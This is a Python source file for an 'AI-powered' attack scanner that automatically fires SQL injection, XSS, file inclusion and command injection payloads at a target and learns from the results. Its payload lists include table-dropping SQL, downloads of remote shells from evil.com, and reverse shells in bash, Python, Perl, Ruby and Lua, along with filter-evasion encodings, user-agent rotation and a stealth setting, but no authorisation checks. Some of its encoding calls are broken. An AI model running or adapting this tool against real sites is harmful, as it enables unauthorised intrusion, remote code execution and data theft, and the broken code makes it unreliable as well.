"""
Intelligent Scanner - AI-Powered Penetration Testing Engine
Uses machine learning to learn and adapt attack strategies
"""

import numpy as np
import pandas as pd
import joblib
import pickle
import json
import time
import random
import hashlib
import logging
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime, timedelta
from dataclasses import dataclass, asdict
from enum import Enum
import requests
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import threading

# Machine Learning imports
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.neural_network import MLPClassifier
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import accuracy_score, precision_recall_fscore_support, confusion_matrix
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers, optimizers, callbacks

# Data science imports
import matplotlib.pyplot as plt
import seaborn as sns
from scipy import stats
import warnings
warnings.filterwarnings('ignore')

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Types of attacks the AI can perform."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    LFI_RFI = "lfi_rfi"
    COMMAND_INJECTION = "command_injection"
    BUFFER_OVERFLOW = "buffer_overflow"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    SOCIAL_ENGINEERING = "social_engineering"
    ZERO_DAY = "zero_day"
    API_ABUSE = "api_abuse"
    DATA_EXFILTRATION = "data_exfiltration"


@dataclass
class AttackResult:
    """Result of an attack attempt with comprehensive data."""
    attack_type: AttackType
    target: str
    payload: str
    success: bool
    response_code: int
    response_time: float
    error_message: Optional[str] = None
    extracted_data: Optional[Dict] = None
    bypass_technique: Optional[str] = None
    confidence_score: float = 0.0
    learning_value: float = 0.0
    timestamp: datetime = None
    session_id: str = ""
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()
        if not self.session_id:
            self.session_id = hashlib.md5(f"{self.target}{self.timestamp}".encode()).hexdigest()[:8]


class IntelligentScanner:
    """
    AI-powered scanner that learns from previous attacks and adapts techniques.
    Built with DevOps principles for reliability and scalability.
    """
    
    def __init__(self, config_path: str = "config/ai_scanner_config.json"):
        self.config_path = config_path
        self.models = {}
        self.scalers = {}
        self.encoders = {}
        self.attack_history = []
        self.success_patterns = {}
        self.failure_patterns = {}
        self.adaptive_payloads = {}
        self.session_data = {}
        self.learning_rate = 0.01
        self.confidence_threshold = 0.7
        
        # Thread safety for concurrent operations
        self.lock = threading.Lock()
        
        # Load configuration
        self.config = self._load_config()
        
        # Initialize models
        self._initialize_models()
        
        # Initialize neural network
        self._initialize_neural_network()
        
        logger.info("IntelligentScanner initialized successfully")
    
    def _load_config(self) -> Dict[str, Any]:
        """Load configuration with error handling."""
        try:
            with open(self.config_path, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            logger.warning(f"Config file {self.config_path} not found, using defaults")
            return self._get_default_config()
        except Exception as e:
            logger.error(f"Error loading config: {e}")
            return self._get_default_config()
    
    def _get_default_config(self) -> Dict[str, Any]:
        """Get default configuration."""
        return {
            "max_attempts": 100,
            "timeout": 10,
            "learning_rate": 0.01,
            "confidence_threshold": 0.7,
            "model_retrain_interval": 50,
            "stealth_mode": True,
            "concurrent_requests": 5,
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ]
        }
    
    def _initialize_models(self):
        """Initialize machine learning models with proper error handling."""
        try:
            # Try to load existing models
            model_path = "models/intelligent_scanner_models.pkl"
            with open(model_path, 'rb') as f:
                saved_data = pickle.load(f)
                self.models = saved_data.get('models', {})
                self.scalers = saved_data.get('scalers', {})
                self.encoders = saved_data.get('encoders', {})
                self.attack_history = saved_data.get('history', [])
                self.success_patterns = saved_data.get('success_patterns', {})
                self.failure_patterns = saved_data.get('failure_patterns', {})
                logger.info("Loaded existing AI models and patterns")
        except FileNotFoundError:
            logger.info("Initializing new AI models")
            self._create_new_models()
        except Exception as e:
            logger.error(f"Error loading models: {e}")
            self._create_new_models()
    
    def _create_new_models(self):
        """Create new machine learning models."""
        for attack_type in AttackType:
            # Random Forest for classification
            self.models[f"{attack_type.value}_rf"] = RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                random_state=42,
                n_jobs=-1
            )
            
            # Gradient Boosting for regression
            self.models[f"{attack_type.value}_gb"] = GradientBoostingClassifier(
                n_estimators=100,
                max_depth=5,
                random_state=42,
                learning_rate=self.learning_rate
            )
            
            # Neural Network
            self.models[f"{attack_type.value}_nn"] = MLPClassifier(
                hidden_layer_sizes=(100, 50, 25),
                max_iter=500,
                random_state=42,
                learning_rate_init=self.learning_rate
            )
            
            # Scaler for feature normalization
            self.scalers[attack_type.value] = StandardScaler()
            
            # Label encoder for categorical features
            self.encoders[attack_type.value] = LabelEncoder()
    
    def _initialize_neural_network(self):
        """Initialize deep learning neural network."""
        try:
            self.neural_network = keras.Sequential([
                layers.Dense(256, activation='relu', input_shape=(100,)),
                layers.Dropout(0.3),
                layers.Dense(128, activation='relu'),
                layers.Dropout(0.2),
                layers.Dense(64, activation='relu'),
                layers.Dropout(0.1),
                layers.Dense(32, activation='relu'),
                layers.Dense(1, activation='sigmoid')
            ])
            
            self.neural_network.compile(
                optimizer=optimizers.Adam(learning_rate=self.learning_rate),
                loss='binary_crossentropy',
                metrics=['accuracy', 'precision', 'recall']
            )
            
            logger.info("Neural network initialized successfully")
        except Exception as e:
            logger.error(f"Error initializing neural network: {e}")
    
    def extract_features(self, target: str, payload: str, response: requests.Response) -> np.ndarray:
        """Extract comprehensive features from attack attempt for ML training."""
        features = []
        
        # Target features (20 features)
        features.extend([
            len(target),
            target.count('.'),
            target.count(':'),
            target.count('/'),
            target.count('?'),
            target.count('='),
            target.count('&'),
            target.count('#'),
            target.count('@'),
            target.count('!'),
            target.count('$'),
            target.count('%'),
            target.count('^'),
            target.count('*'),
            target.count('('),
            target.count(')'),
            target.count('-'),
            target.count('_'),
            target.count('+'),
            target.count('~'),
        ])
        
        # Payload features (40 features)
        features.extend([
            len(payload),
            payload.count("'"),
            payload.count('"'),
            payload.count(';'),
            payload.count('--'),
            payload.count('/*'),
            payload.count('*/'),
            payload.count('union'),
            payload.count('select'),
            payload.count('insert'),
            payload.count('update'),
            payload.count('delete'),
            payload.count('drop'),
            payload.count('exec'),
            payload.count('eval'),
            payload.count('script'),
            payload.count('javascript'),
            payload.count('onload'),
            payload.count('onerror'),
            payload.count('onclick'),
            payload.count('onmouseover'),
            payload.count('onfocus'),
            payload.count('onblur'),
            payload.count('onchange'),
            payload.count('onsubmit'),
            payload.count('onreset'),
            payload.count('onkeydown'),
            payload.count('onkeyup'),
            payload.count('onkeypress'),
            payload.count('onmousedown'),
            payload.count('onmouseup'),
            payload.count('onmousemove'),
            payload.count('onmouseout'),
            payload.count('ondblclick'),
            payload.count('oncontextmenu'),
            payload.count('onabort'),
            payload.count('onbeforeunload'),
            payload.count('onerror'),
            payload.count('onhashchange'),
            payload.count('onmessage'),
            payload.count('onoffline'),
            payload.count('ononline'),
        ])
        
        # Response features (40 features)
        features.extend([
            response.status_code,
            len(response.text),
            response.elapsed.total_seconds(),
            response.headers.get('content-length', 0),
            response.headers.get('content-type', '').count('html'),
            response.headers.get('content-type', '').count('json'),
            response.headers.get('content-type', '').count('xml'),
            response.text.count('error'),
            response.text.count('exception'),
            response.text.count('warning'),
            response.text.count('success'),
            response.text.count('failed'),
            response.text.count('invalid'),
            response.text.count('unauthorized'),
            response.text.count('forbidden'),
            response.text.count('not found'),
            response.text.count('internal server error'),
            response.text.count('database'),
            response.text.count('sql'),
            response.text.count('mysql'),
            response.text.count('postgresql'),
            response.text.count('oracle'),
            response.text.count('mssql'),
            response.text.count('sqlite'),
            response.text.count('mongodb'),
            response.text.count('redis'),
            response.text.count('memcached'),
            response.text.count('elasticsearch'),
            response.text.count('cassandra'),
            response.text.count('dynamodb'),
            response.text.count('firebase'),
            response.text.count('auth'),
            response.text.count('login'),
            response.text.count('register'),
            response.text.count('password'),
            response.text.count('token'),
            response.text.count('session'),
            response.text.count('cookie'),
            response.text.count('csrf'),
            response.text.count('xss'),
            response.text.count('injection'),
        ])
        
        # Pad to 100 features
        while len(features) < 100:
            features.append(0)
        
        return np.array(features[:100])
    
    def predict_success_probability(self, target: str, payload: str, attack_type: AttackType) -> float:
        """Predict the probability of success for an attack using ensemble methods."""
        try:
            # Make a test request to extract features
            headers = {'User-Agent': random.choice(self.config['user_agents'])}
            test_response = requests.get(target, timeout=self.config['timeout'], headers=headers)
            features = self.extract_features(target, payload, test_response)
            
            # Scale features
            scaler = self.scalers.get(attack_type.value)
            if scaler:
                features_scaled = scaler.transform(features.reshape(1, -1))
            else:
                features_scaled = features.reshape(1, -1)
            
            # Get predictions from all models
            predictions = []
            
            # Random Forest prediction
            rf_model = self.models.get(f"{attack_type.value}_rf")
            if rf_model:
                pred = rf_model.predict_proba(features_scaled)[0][1]
                predictions.append(pred)
            
            # Gradient Boosting prediction
            gb_model = self.models.get(f"{attack_type.value}_gb")
            if gb_model:
                pred = gb_model.predict_proba(features_scaled)[0][1]
                predictions.append(pred)
            
            # Neural Network prediction
            nn_model = self.models.get(f"{attack_type.value}_nn")
            if nn_model:
                pred = nn_model.predict_proba(features_scaled)[0][1]
                predictions.append(pred)
            
            # Deep Neural Network prediction
            nn_pred = self.neural_network.predict(features_scaled.astype(np.float32))[0][0]
            predictions.append(nn_pred)
            
            # Return weighted average prediction
            if predictions:
                weights = [0.3, 0.3, 0.2, 0.2]  # RF, GB, NN, DNN
                return np.average(predictions, weights=weights[:len(predictions)])
            
            return 0.5
            
        except Exception as e:
            logger.error(f"Error predicting success probability: {e}")
            return 0.5
    
    def generate_adaptive_payload(self, target: str, attack_type: AttackType, previous_failures: List[str]) -> str:
        """Generate adaptive payload based on learning from previous failures."""
        
        # Enhanced base payloads for different attack types
        base_payloads = {
            AttackType.SQL_INJECTION: [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "' OR 1=1--",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR 'x'='x",
                "'; EXEC xp_cmdshell('dir')--",
                "' UNION SELECT username,password FROM users--",
                "' OR EXISTS(SELECT * FROM users)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "'; DECLARE @q VARCHAR(8000);SET @q='SELECT * FROM users';EXEC(@q)--"
            ],
            AttackType.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<details open ontoggle=alert('XSS')>",
                "<video><source onerror=alert('XSS')>",
                "<audio onloadstart=alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
                "<object data=javascript:alert('XSS')>",
                "<applet code=javascript:alert('XSS')>",
                "<marquee onstart=alert('XSS')>"
            ],
            AttackType.LFI_RFI: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
                "expect://id",
                "input://",
                "phar://",
                "zip://",
                "file:///etc/passwd",
                "http://evil.com/shell.txt",
                "ftp://evil.com/shell.txt",
                "gopher://evil.com/_GET",
                "dict://evil.com:1337/",
                "ldap://evil.com/%0astring",
                "tftp://evil.com/shell"
            ],
            AttackType.COMMAND_INJECTION: [
                "; ls",
                "| whoami",
                "& dir",
                "&& cat /etc/passwd",
                "|| ping -c 1 127.0.0.1",
                "; wget http://evil.com/shell",
                "| nc -l 4444",
                "& powershell -c \"Invoke-WebRequest\"",
                "; curl http://evil.com/shell",
                "| bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
                "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "& certutil -urlcache -split -f http://evil.com/shell.exe",
                "; perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                "| ruby -rsocket -e'f=TCPSocket.open(\"127.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "; lua -e \"require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
            ]
        }
        
        payloads = base_payloads.get(attack_type, [])
        
        # Apply advanced adaptive modifications
        adaptive_payloads = []
        for payload in payloads:
            # Basic encoding variations
            adaptive_payloads.extend([
                payload,
                payload.replace("'", "\\'"),
                payload.replace("'", "''"),
                payload.replace("'", "%27"),
                payload.replace("'", "&#39;"),
                payload.replace("<", "&lt;"),
                payload.replace(">", "&gt;"),
                payload.replace("\"", "&quot;"),
                payload.replace("&", "&amp;"),
            ])
            
            # Advanced encoding techniques
            adaptive_payloads.extend([
                payload.encode('hex').decode(),
                payload.encode('base64').decode(),
                payload.encode('rot13'),
                payload.replace(" ", "+"),
                payload.replace(" ", "%20"),
                payload.replace(" ", "&#32;"),
                payload.replace(" ", "\\u0020"),
                payload.replace("'", "\\u0027"),
                payload.replace("\"", "\\u0022"),
                payload.replace("<", "\\u003c"),
                payload.replace(">", "\\u003e"),
            ])
            
            # Polymorphic variations
            adaptive_payloads.extend([
                payload + "/*" + "A" * random.randint(1, 10) + "*/",
                "/*" + "B" * random.randint(1, 10) + "*/" + payload,
                payload.replace("SELECT", "SeLeCt"),
                payload.replace("UNION", "UnIoN"),
                payload.replace("script", "ScRiPt"),
                payload.replace("alert", "AlErT"),
            ])
        
        # Add learned bypass techniques
        bypass_techniques = self.success_patterns.get(attack_type.value, [])
        for technique in bypass_techniques:
            adaptive_payloads.append(technique)
        
        # Remove previously failed payloads
        adaptive_payloads = [p for p in adaptive_payloads if p not in previous_failures]
        
        # Return weighted random payload
        if adaptive_payloads:
            # Weight successful patterns higher
            weights = []
            for payload in adaptive_payloads:
                if payload in bypass_techniques:
                    weights.append(5.0)  # Higher weight for successful patterns
                elif any(tech in payload for tech in bypass_techniques):
                    weights.append(3.0)  # Medium weight for similar patterns
                else:
                    weights.append(1.0)
            
            return random.choices(adaptive_payloads, weights=weights)[0]
        
        return random.choice(payloads) if payloads else ""
    
    def learn_from_result(self, result: AttackResult):
        """Learn from attack result to improve future attacks."""
        with self.lock:
            self.attack_history.append(result)
            
            # Update success/failure patterns
            if result.success:
                if result.attack_type.value not in self.success_patterns:
                    self.success_patterns[result.attack_type.value] = []
                self.success_patterns[result.attack_type.value].append(result.payload)
                
                # Store bypass technique if found
                if result.bypass_technique:
                    self.success_patterns[result.attack_type.value].append(result.bypass_technique)
            else:
                if result.attack_type.value not in self.failure_patterns:
                    self.failure_patterns[result.attack_type.value] = []
                self.failure_patterns[result.attack_type.value].append(result.payload)
            
            # Retrain models periodically
            if len(self.attack_history) % self.config['model_retrain_interval'] == 0:
                self._retrain_models()
    
    def _retrain_models(self):
        """Retrain machine learning models with new data."""
        try:
            logger.info("Retraining AI models with new data...")
            
            # Prepare training data
            X = []
            y = []
            
            for result in self.attack_history:
                try:
                    headers = {'User-Agent': random.choice(self.config['user_agents'])}
                    test_response = requests.get(result.target, timeout=self.config['timeout'], headers=headers)
                    features = self.extract_features(result.target, result.payload, test_response)
                    X.append(features)
                    y.append(1 if result.success else 0)
                except:
                    continue
            
            if len(X) < 10:  # Need minimum data to train
                logger.warning("Insufficient data for retraining")
                return
            
            X = np.array(X)
            y = np.array(y)
            
            # Split data
            X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
            
            # Retrain models for each attack type
            for attack_type in AttackType:
                attack_results = [r for r in self.attack_history if r.attack_type == attack_type]
                if len(attack_results) < 5:
                    continue
                
                # Scale features
                scaler = self.scalers[attack_type.value]
                X_train_scaled = scaler.fit_transform(X_train)
                X_test_scaled = scaler.transform(X_test)
                
                # Retrain Random Forest
                rf_model = self.models[f"{attack_type.value}_rf"]
                rf_model.fit(X_train_scaled, y_train)
                
                # Retrain Gradient Boosting
                gb_model = self.models[f"{attack_type.value}_gb"]
                gb_model.fit(X_train_scaled, y_train)
                
                # Retrain Neural Network
                nn_model = self.models[f"{attack_type.value}_nn"]
                nn_model.fit(X_train_scaled, y_train)
                
                # Retrain Deep Neural Network
                self.neural_network.fit(
                    X_train_scaled.astype(np.float32),
                    y_train.astype(np.float32),
                    epochs=10,
                    batch_size=32,
                    verbose=0,
                    validation_data=(X_test_scaled.astype(np.float32), y_test.astype(np.float32))
                )
                
                # Evaluate models
                rf_pred = rf_model.predict(X_test_scaled)
                gb_pred = gb_model.predict(X_test_scaled)
                nn_pred = nn_model.predict(X_test_scaled)
                dnn_pred = (self.neural_network.predict(X_test_scaled.astype(np.float32)) > 0.5).astype(int)
                
                logger.info(f"Model accuracy for {attack_type.value}: "
                           f"RF={accuracy_score(y_test, rf_pred):.3f}, "
                           f"GB={accuracy_score(y_test, gb_pred):.3f}, "
                           f"NN={accuracy_score(y_test, nn_pred):.3f}, "
                           f"DNN={accuracy_score(y_test, dnn_pred):.3f}")
            
            # Save updated models
            self._save_models()
            logger.info("Models retrained and saved successfully")
            
        except Exception as e:
            logger.error(f"Error retraining models: {e}")
    
    def _save_models(self):
        """Save trained models and patterns."""
        try:
            save_data = {
                'models': self.models,
                'scalers': self.scalers,
                'encoders': self.encoders,
                'history': self.attack_history,
                'success_patterns': self.success_patterns,
                'failure_patterns': self.failure_patterns
            }
            
            with open("models/intelligent_scanner_models.pkl", 'wb') as f:
                pickle.dump(save_data, f)
            
            logger.info("Models saved successfully")
        except Exception as e:
            logger.error(f"Error saving models: {e}")
    
    async def intelligent_attack_async(self, target: str, attack_type: AttackType, max_attempts: int = None) -> List[AttackResult]:
        """Perform intelligent attack with async capabilities."""
        if max_attempts is None:
            max_attempts = self.config['max_attempts']
        
        results = []
        previous_failures = []
        
        logger.info(f"Starting intelligent {attack_type.value} attack on {target}")
        
        async with aiohttp.ClientSession() as session:
            for attempt in range(max_attempts):
                # Generate adaptive payload
                payload = self.generate_adaptive_payload(target, attack_type, previous_failures)
                
                # Predict success probability
                success_prob = self.predict_success_probability(target, payload, attack_type)
                
                logger.info(f"Attempt {attempt + 1}: Success probability = {success_prob:.3f}")
                
                # Skip low probability attempts unless we're desperate
                if success_prob < 0.1 and attempt < max_attempts - 10:
                    continue
                
                # Execute attack
                result = await self._execute_attack_async(session, target, payload, attack_type)
                results.append(result)
                
                # Learn from result
                self.learn_from_result(result)
                
                if result.success:
                    logger.info(f"✅ Attack successful! Payload: {payload}")
                    break
                else:
                    previous_failures.append(payload)
                    logger.info(f"❌ Attack failed. Trying adaptive approach...")
                
                # Adaptive delay
                await asyncio.sleep(random.uniform(0.5, 2.0))
        
        return results
    
    async def _execute_attack_async(self, session: aiohttp.ClientSession, target: str, payload: str, attack_type: AttackType) -> AttackResult:
        """Execute a single attack attempt asynchronously."""
        start_time = time.time()
        
        try:
            if attack_type == AttackType.SQL_INJECTION:
                result = await self._sql_injection_attack_async(session, target, payload)
            elif attack_type == AttackType.XSS:
                result = await self._xss_attack_async(session, target, payload)
            elif attack_type == AttackType.LFI_RFI:
                result = await self._lfi_rfi_attack_async(session, target, payload)
            elif attack_type == AttackType.COMMAND_INJECTION:
                result = await self._command_injection_attack_async(session, target, payload)
            else:
                result = await self._generic_attack_async(session, target, payload)
            
            result.response_time = time.time() - start_time
            return result
            
        except Exception as e:
            return AttackResult(
                attack_type=attack_type,
                target=target,
                payload=payload,
                success=False,
                response_code=0,
                response_time=time.time() - start_time,
                error_message=str(e)
            )
    
    async def _sql_injection_attack_async(self, session: aiohttp.ClientSession, target: str, payload: str) -> AttackResult:
        """Execute SQL injection attack asynchronously."""
        # Test for SQL injection vulnerabilities
        test_urls = [
            f"{target}?id={payload}",
            f"{target}?user={payload}",
            f"{target}?search={payload}",
            f"{target}?q={payload}",
            f"{target}?param={payload}"
        ]
        
        headers = {'User-Agent': random.choice(self.config['user_agents'])}
        
        for url in test_urls:
            try:
                async with session.get(url, headers=headers, timeout=self.config['timeout']) as response:
                    text = await response.text()
                    
                    # Check for SQL error messages
                    error_indicators = [
                        "sql syntax", "mysql", "oracle", "postgresql", "sqlite",
                        "syntax error", "mysql_fetch", "mysql_num_rows",
                        "mysql_result", "mysql_query", "mysql_connect",
                        "ora-", "sql server", "microsoft ole db provider",
                        "unclosed quotation mark", "incorrect syntax"
                    ]
                    
                    success = any(indicator in text.lower() for indicator in error_indicators)
                    
                    return AttackResult(
                        attack_type=AttackType.SQL_INJECTION,
                        target=url,
                        payload=payload,
                        success=success,
                        response_code=response.status,
                        response_time=0,
                        extracted_data={"response_text": text[:500]} if success else None
                    )
                    
            except Exception:
                continue
        
        return AttackResult(
            attack_type=AttackType.SQL_INJECTION,
            target=target,
            payload=payload,
            success=False,
            response_code=0,
            response_time=0
        )
    
    async def _xss_attack_async(self, session: aiohttp.ClientSession, target: str, payload: str) -> AttackResult:
        """Execute XSS attack asynchronously."""
        # Test for XSS vulnerabilities
        test_data = {
            "search": payload,
            "comment": payload,
            "message": payload,
            "input": payload,
            "text": payload
        }
        
        headers = {'User-Agent': random.choice(self.config['user_agents'])}
        
        try:
            async with session.post(target, data=test_data, headers=headers, timeout=self.config['timeout']) as response:
                text = await response.text()
                
                # Check if payload is reflected in response
                success = payload in text
                
                return AttackResult(
                    attack_type=AttackType.XSS,
                    target=target,
                    payload=payload,
                    success=success,
                    response_code=response.status,
                    response_time=0,
                    extracted_data={"response_text": text[:500]} if success else None
                )
                
        except Exception as e:
            return AttackResult(
                attack_type=AttackType.XSS,
                target=target,
                payload=payload,
                success=False,
                response_code=0,
                response_time=0,
                error_message=str(e)
            )
    
    async def _lfi_rfi_attack_async(self, session: aiohttp.ClientSession, target: str, payload: str) -> AttackResult:
        """Execute LFI/RFI attack asynchronously."""
        # Test for file inclusion vulnerabilities
        test_urls = [
            f"{target}?file={payload}",
            f"{target}?page={payload}",
            f"{target}?include={payload}",
            f"{target}?path={payload}",
            f"{target}?doc={payload}"
        ]
        
        headers = {'User-Agent': random.choice(self.config['user_agents'])}
        
        for url in test_urls:
            try:
                async with session.get(url, headers=headers, timeout=self.config['timeout']) as response:
                    text = await response.text()
                    
                    # Check for file inclusion indicators
                    success_indicators = [
                        "root:", "bin:", "etc/passwd", "windows/system32",
                        "php://", "data://", "expect://", "input://",
                        "[boot loader]", "[operating systems]", "default="
                    ]
                    
                    success = any(indicator in text for indicator in success_indicators)
                    
                    return AttackResult(
                        attack_type=AttackType.LFI_RFI,
                        target=url,
                        payload=payload,
                        success=success,
                        response_code=response.status,
                        response_time=0,
                        extracted_data={"response_text": text[:500]} if success else None
                    )
                    
            except Exception:
                continue
        
        return AttackResult(
            attack_type=AttackType.LFI_RFI,
            target=target,
            payload=payload,
            success=False,
            response_code=0,
            response_time=0
        )
    
    async def _command_injection_attack_async(self, session: aiohttp.ClientSession, target: str, payload: str) -> AttackResult:
        """Execute command injection attack asynchronously."""
        # Test for command injection vulnerabilities
        test_data = {
            "cmd": payload,
            "command": payload,
            "exec": payload,
            "system": payload,
            "shell": payload
        }
        
        headers = {'User-Agent': random.choice(self.config['user_agents'])}
        
        try:
            async with session.post(target, data=test_data, headers=headers, timeout=self.config['timeout']) as response:
                text = await response.text()
                
                # Check for command execution indicators
                success_indicators = [
                    "uid=", "gid=", "groups=", "root", "administrator",
                    "windows", "linux", "unix", "command", "execution",
                    "volume in drive", "directory of", "bytes free"
                ]
                
                success = any(indicator in text.lower() for indicator in success_indicators)
                
                return AttackResult(
                    attack_type=AttackType.COMMAND_INJECTION,
                    target=target,
                    payload=payload,
                    success=success,
                    response_code=response.status,
                    response_time=0,
                    extracted_data={"response_text": text[:500]} if success else None
                )
                
        except Exception as e:
            return AttackResult(
                attack_type=AttackType.COMMAND_INJECTION,
                target=target,
                payload=payload,
                success=False,
                response_code=0,
                response_time=0,
                error_message=str(e)
            )
    
    async def _generic_attack_async(self, session: aiohttp.ClientSession, target: str, payload: str) -> AttackResult:
        """Execute generic attack asynchronously."""
        headers = {'User-Agent': random.choice(self.config['user_agents'])}
        
        try:
            async with session.get(target, headers=headers, timeout=self.config['timeout']) as response:
                return AttackResult(
                    attack_type=AttackType.SQL_INJECTION,  # Default
                    target=target,
                    payload=payload,
                    success=False,
                    response_code=response.status,
                    response_time=0
                )
                
        except Exception as e:
            return AttackResult(
                attack_type=AttackType.SQL_INJECTION,  # Default
                target=target,
                payload=payload,
                success=False,
                response_code=0,
                response_time=0,
                error_message=str(e)
            )
    
    def get_attack_statistics(self) -> Dict[str, Any]:
        """Get comprehensive statistics about attack performance."""
        if not self.attack_history:
            return {"message": "No attack history available"}
        
        total_attacks = len(self.attack_history)
        successful_attacks = len([r for r in self.attack_history if r.success])
        success_rate = successful_attacks / total_attacks if total_attacks > 0 else 0
        
        # Calculate average response times
        avg_response_time = np.mean([r.response_time for r in self.attack_history if r.response_time > 0])
        
        # Attack type statistics
        attack_type_stats = {}
        for attack_type in AttackType:
            type_attacks = [r for r in self.attack_history if r.attack_type == attack_type]
            if type_attacks:
                type_success = len([r for r in type_attacks if r.success])
                type_avg_time = np.mean([r.response_time for r in type_attacks if r.response_time > 0])
                attack_type_stats[attack_type.value] = {
                    "total": len(type_attacks),
                    "successful": type_success,
                    "success_rate": type_success / len(type_attacks),
                    "avg_response_time": type_avg_time
                }
        
        # Learning progress
        recent_attacks = self.attack_history[-50:] if len(self.attack_history) >= 50 else self.attack_history
        recent_success_rate = len([r for r in recent_attacks if r.success]) / len(recent_attacks) if recent_attacks else 0
        
        return {
            "total_attacks": total_attacks,
            "successful_attacks": successful_attacks,
            "overall_success_rate": success_rate,
            "recent_success_rate": recent_success_rate,
            "avg_response_time": avg_response_time,
            "attack_type_statistics": attack_type_stats,
            "success_patterns_count": {k: len(v) for k, v in self.success_patterns.items()},
            "failure_patterns_count": {k: len(v) for k, v in self.failure_patterns.items()},
            "learning_progress": {
                "patterns_learned": sum(len(v) for v in self.success_patterns.values()),
                "models_trained": len(self.models),
                "data_points": total_attacks
            }
        } 